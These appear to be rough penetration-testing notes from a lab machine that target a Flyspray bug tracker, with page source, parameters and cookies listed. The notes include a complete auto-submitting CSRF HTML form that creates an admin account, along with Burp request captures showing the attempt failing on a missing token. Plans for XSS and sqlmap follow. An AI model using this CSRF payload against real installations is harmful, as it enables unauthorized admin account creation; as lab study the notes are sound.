Able to register a user and login on the flyspray bug reporting page\.  Seeing lots of params here, sqlmap immediately comes to mind:
After logging in to GET /flyspray/index\.php?do=toplevel\&project=1 I have see all of these:

\<link rel="section" type="text/html" href="[http://10.1.20.110/flyspray/?project=1](#http://view-source:http://10.1.20.110/flyspray/?project=1)
" /\>
\<link media="screen" href="[http://10.1.20.110/flyspray/themes/CleanFS/theme.css](#http://view-source:http://10.1.20.110/flyspray/themes/CleanFS/theme.css)
" rel="stylesheet" type="text/css" /\>
\<link media="print"  href="[http://10.1.20.110/flyspray/themes/CleanFS/theme_print.css](#http://view-source:http://10.1.20.110/flyspray/themes/CleanFS/theme_print.css)
" rel="stylesheet" type="text/css" /\>
\<link href="[http://10.1.20.110/flyspray/themes/CleanFS/font-awesome.min.css](#http://view-source:http://10.1.20.110/flyspray/themes/CleanFS/font-awesome.min.css)
" rel="stylesheet" type="text/css" /\>
\<link rel="alternate" type="application/rss\+xml" title="Flyspray RSS 1\.0 Feed"
href="[http://10.1.20.110/flyspray/feed.php?feed_type=rss1&amp;project=1](#http://view-source:http://10.1.20.110/flyspray/feed.php?feed_type=rss1&project=1)
" /\>
\<link rel="alternate" type="application/rss\+xml" title="Flyspray RSS 2\.0 Feed"
href="[http://10.1.20.110/flyspray/feed.php?feed_type=rss2&amp;project=1](#http://view-source:http://10.1.20.110/flyspray/feed.php?feed_type=rss2&project=1)
" /\>
\<link rel="alternate" type="application/atom\+xml" title="Flyspray Atom 0\.3 Feed"
href="[http://10.1.20.110/flyspray/feed.php?feed_type=atom&amp;project=1](#http://view-source:http://10.1.20.110/flyspray/feed.php?feed_type=atom&project=1)
" /\>

\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/prototype/prototype.js](#http://view-source:http://10.1.20.110/flyspray/js/prototype/prototype.js)
"\>\</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/script.aculo.us/scriptaculous.js](#http://view-source:http://10.1.20.110/flyspray/js/script.aculo.us/scriptaculous.js)
"\>\</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/index.js](#http://view-source:http://10.1.20.110/flyspray/js/index.js)
"\>\</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/tabs.js](#http://view-source:http://10.1.20.110/flyspray/js/tabs.js)
"\>\</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/functions.js](#http://view-source:http://10.1.20.110/flyspray/js/functions.js)
"\>\</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/jscalendar/calendar_stripped.js](#http://view-source:http://10.1.20.110/flyspray/js/jscalendar/calendar_stripped.js)
"\>\</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/jscalendar/calendar-setup_stripped.js](#http://view-source:http://10.1.20.110/flyspray/js/jscalendar/calendar-setup_stripped.js)
"\> \</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/jscalendar/lang/calendar-en.js](#http://view-source:http://10.1.20.110/flyspray/js/jscalendar/lang/calendar-en.js)
"\>\</script\>
\<script type="text/javascript" src="[http://10.1.20.110/flyspray/js/lightbox/js/lightbox.js](#http://view-source:http://10.1.20.110/flyspray/js/lightbox/js/lightbox.js)
"\>\</script\>
\<link rel="stylesheet" href="[http://10.1.20.110/flyspray/js/lightbox/css/lightbox.css](#http://view-source:http://10.1.20.110/flyspray/js/lightbox/css/lightbox.css)
" type="text/css" media="screen" /\>
\<\!\-\-\[if IE\]\>
\<link media="screen" href="http://10\.1\.20\.110/flyspray/themes/CleanFS/ie\.css" rel="stylesheet" type="text/css" /\>
\<\!\[endif\]\-\-\>
\</head\>
\<body onload="" class="index p1"\>

\<h1 id="title"\>\<a href="[http://10.1.20.110/flyspray/](#http://view-source:http://10.1.20.110/flyspray/)
"\>
\<img src="[http://10.1.20.110/flyspray//flyspray_small.png](#http://view-source:http://10.1.20.110/flyspray//flyspray_small.png)
" /\>	\<span\>symfonos bugs\</span\>
\</a\>\</h1\>
\<input id="menu1" type="checkbox"\>
\<label id="labelmenu1" for="menu1"\>\</label\>
\<div id="menu"\>\<ul id="menu\-list"\>\<li class="first"\>
\<input type="checkbox" id="s\_loginbox" /\>
\<label for="s\_loginbox" id="show\_loginbox" accesskey="l"\>Login\!\</label\>
\<div id="loginbox" class="popup"\>\<form id="login" action="[http://10.1.20.110/flyspray/index.php?do=authenticate](#http://view-source:http://10.1.20.110/flyspray/index.php?do=authenticate)
" method="post"\>
\<div id="login\_input"\>
\<input placeholder="Username" class="text" type="text" id="lbl\_user\_name" name="user\_name" size="17" maxlength="32" /\>
\<input placeholder="Password" class="password" type="password" id="lbl\_password" name="password" size="17" maxlength="100" /\>
\<label for="lbl\_remember"\>Remember me\</label\>
\<input type="checkbox" id="lbl\_remember" name="remember\_login" /\>
\<input type="hidden" name="return\_to" value="/flyspray/" /\>
\<input type="submit" value="Login\!" name="login" id="login\_button" /\>
\</div\>
\<div id="login\_links"\>
\<a id="registerlink"
href="[http://10.1.20.110/flyspray/index.php?do=register](#http://view-source:http://10.1.20.110/flyspray/index.php?do=register)
"\>Register\</a\>
\<a id="forgotlink"
href="[http://10.1.20.110/flyspray/index.php?do=lostpw](#http://view-source:http://10.1.20.110/flyspray/index.php?do=lostpw)
"\>Lost password?\</a\>
\</div\>
\<div id="login\_oauth"\>
\</div\>
\</form\>
\</div\>
\</li\>\</ul\>
\</div\>\<div id="pm\-menu"\>
\<input id="pmmenu" type="checkbox"\>
\<label id="labelpmmenu" for="pmmenu"\>\</label\>
\<ul id="pm\-menu\-list"\>\<li class="first"\>
\<a id="toplevellink"
href="[http://10.1.20.110/flyspray/index.php?do=toplevel&amp;project=1](#http://view-source:http://10.1.20.110/flyspray/index.php?do=toplevel&project=1)
"\>Overview\</a\>
\</li\>\<li\>
\<a id="homelink"
class="active" 		href="[http://10.1.20.110/flyspray/index.php?do=tasklist&amp;project=1](#http://view-source:http://10.1.20.110/flyspray/index.php?do=tasklist&project=1)
"\>Tasklist\</a\>
\</li\>\<li\>
\<a id="roadmaplink"
href="[http://10.1.20.110/flyspray/index.php?do=roadmap&amp;project=1](#http://view-source:http://10.1.20.110/flyspray/index.php?do=roadmap&project=1)
"\>Roadmap\</a\>
\</li\>	\</ul\>
\<div id="pmcontrol"\>
\<div id="projectselector"\>			\<form id="projectselectorform" action="[http://10.1.20.110/flyspray/index.php](#http://view-source:http://10.1.20.110/flyspray/index.php)
" method="get"\>
\<select name="project" onchange="document\.getElementById\('projectselectorform'\)\.submit\(\)"\>
\<option value="0"\>All Projects\</option\>\<optgroup\>\<option value="1" selected="selected"\>symfonos bugs\</option\>\</optgroup\>	

\<input id="s\_searchstate" type="checkbox" name="advancedsearch"/\>
\<label id="searchstateactions" for="s\_searchstate"\>Advanced\</label\>
\<div id="sc2" class="switchcontent"\>
\<fieldset class="advsearch\_misc"\>

Ajax\.Autocompleter\('opened', 'opened\_complete', 'http://10\.1\.20\.110/flyspray/js/callbacks/usersearch\.php', \{\}\)




**Index\.html Params:
**do=toplevel
do=tasklist
do=register
do=lastpw
do=authenticate
order=id
sort
project=1

do,order,sort,project

**Cookie:**flyspray=vqdon292f5oe97u5mq1sh9ffsir24583; flyspray\_userid=2; flyspray\_passhash=64ZSnpVGSFAsc; lang=en\-US; i\_like\_gitea=11a20aa94131e2a5; \_csrf=rY4OYSPLkUiba6KzUf6EO23ncXw6MTU4NjQwODQyNTQ3NDMyMjA1Ng

\<input type="hidden" name="csrftoken" id="deletesearchtoken" value="50620769"\>

**other pages:
**flyspray/js/callbacks/usersearch\.php
[/flyspray/index.php?do=tasklist&amp;project=1&amp;order=id&amp;sort=desc](#http://view-source:http://10.1.20.110/flyspray/index.php?do=tasklist&project=1&order=id&sort=desc)

[/flyspray/index.php?do=details&amp;task_id=1](#http://view-source:http://10.1.20.110/flyspray/index.php?do=details&task_id=1)
"

Find a bug in older 0\.996 flyspray, allowing me to create a Cross site forgery with the following HTML\.

However, now flyspray uses CRSF tokens to disallow this\.  I think I may be able to overcome this by including the CSRF token, lets see if this version allows it\.  HTML:

\<html\>
\<body onload="javascript:document\.forms\[0\]\.submit\(\)"\>
\<H2\>CSRF Exploit to add ADMIN account\</H2\>
\<form method="POST" name="form0" action="[http://10.1.20.110:80/flyspray/index.php?do=admin&area=newuser">](#http://10.1.20.110:80/flyspray/index.php?do=admin&area=newuser">)

\<input type="hidden" name="action" value="admin\.newuser"/\>
\<input type="hidden" name="do" value="admin"/\>
\<input type="hidden" name="area" value="newuser"/\>
\<input type="hidden" name="user\_name" value="root"/\>
\<input type="hidden" name="user\_pass" value="12345678"/\>
\<input type="hidden" name="user\_pass2" value="12345678"/\>
\<input type="hidden" name="real\_name" value="root"/\>
\<input type="hidden" name="email\_address" value="root@root\.com"/\>
\<input type="hidden" name="jabber\_id" value=""/\>
\<input type="hidden" name="notify\_type" value="0"/\>
\<input type="hidden" name="time\_zone" value="0"/\>
\<input type="hidden" name="group\_in" value="1"/\>
\</form\>
\</body\>
\</html\>


**Go to create new user, burp shows:**

Cookie: flyspray=lt4ompvabcmq7o4cj4od78g4c6uclonb; lang=en\-US; i\_like\_gitea=11a20aa94131e2a5; \_csrf=rY4OYSPLkUiba6KzUf6EO23ncXw6MTU4NjQwODQyNTQ3NDMyMjA1Ng

**Navigte to to my html, find the following request in burp:
**
POST /flyspray/index\.php?do=admin\&area=newuser HTTP/1\.1
Host: 10\.1\.20\.110
User\-Agent: Mozilla/5\.0 \(X11; Linux x86\_64; rv:68\.0\) Gecko/20100101 Firefox/68\.0
Accept: text/html,application/xhtml\+xml,application/xml;q=0\.9,\*/\*;q=0\.8
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
Content\-Type: application/x\-www\-form\-urlencoded
Content\-Length: 189
Connection: close
Cookie: flyspray=lt4ompvabcmq7o4cj4od78g4c6uclonb; lang=en\-US; i\_like\_gitea=11a20aa94131e2a5; \_csrf=rY4OYSPLkUiba6KzUf6EO23ncXw6MTU4NjQwODQyNTQ3NDMyMjA1Ng
Upgrade\-Insecure\-Requests: 1

action=admin\.newuser\&do=admin\&area=newuser\&user\_name=root\&user\_pass=12345678\&user\_pass2=12345678\&real\_name=root\&email\_address=root%40root\.com\&jabber\_id=\&notify\_type=0\&time\_zone=0\&group\_in=1

**response: 
**
missingtoken

**Try creating new user and look at the request it sends, to try to match this up:
**
POST /flyspray/index\.php?do=admin HTTP/1\.1
Host: 10\.1\.20\.110
User\-Agent: Mozilla/5\.0 \(X11; Linux x86\_64; rv:68\.0\) Gecko/20100101 Firefox/68\.0
Accept: text/html,application/xhtml\+xml,application/xml;q=0\.9,\*/\*;q=0\.8
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
Referer: [http://10.1.20.110/flyspray/index.php?do=admin](#http://10.1.20.110/flyspray/index.php?do=register)

Content\-Type: multipart/form\-data; boundary=\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Length: 1448
Connection: close
Cookie: flyspray=lt4ompvabcmq7o4cj4od78g4c6uclonb; lang=en\-US; i\_like\_gitea=11a20aa94131e2a5; \_csrf=rY4OYSPLkUiba6KzUf6EO23ncXw6MTU4NjQwODQyNTQ3NDMyMjA1Ng
Upgrade\-Insecure\-Requests: 1

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="csrftoken"

2057665645
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="action"

admin\.newuser
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="user\_name"

user1
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="user\_pass"

user1
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="user\_pass2"

user1
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="real\_name"

user1
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="email\_address"

user1@no\.way
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="verify\_email\_address"

user1@no\.way
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="profile\_image"; filename=""
Content\-Type: application/octet\-stream


\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="notify\_type"

0
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="time\_zone"

0
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457
Content\-Disposition: form\-data; name="group\_in"

1
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-5650162856761576351416069457\-\-


Got redirect:
HTTP/1\.1 303 See Other
Date: Thu, 09 Apr 2020 08:28:58 GMT
Server: Apache/2\.4\.6 \(CentOS\) PHP/5\.6\.40
X\-Powered\-By: PHP/5\.6\.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no\-cache
Cache\-Control: no\-store, no\-cache, must\-revalidate, post\-check=0, pre\-check=0
Content\-Style\-Type: text/css
Location: [http://10.1.20.110/flyspray/](#http://10.1.20.110/flyspray/)

Content\-Length: 85
Connection: close
Content\-Type: text/html; charset=utf\-8

Redirect to: \<a href="[http://10.1.20.110/flyspray/">http://10.1.20.110/flyspray/</a>.](#http://10.1.20.110/flyspray/">http://10.1.20.110/flyspray/</a>.)


**User profile page shows me as not admin still**\.  **Check out other exploits, this is flyspray v1\.0**

**Try another XSS in the real\_name field, this one fails also \(was for RC4, not final 1\.0\)
**
Try sqlmap to see if I can do any SQL injection on flyspray:


http://10\.1\.20\.110/flyspray/js/callbacks/usersearch\.php', 
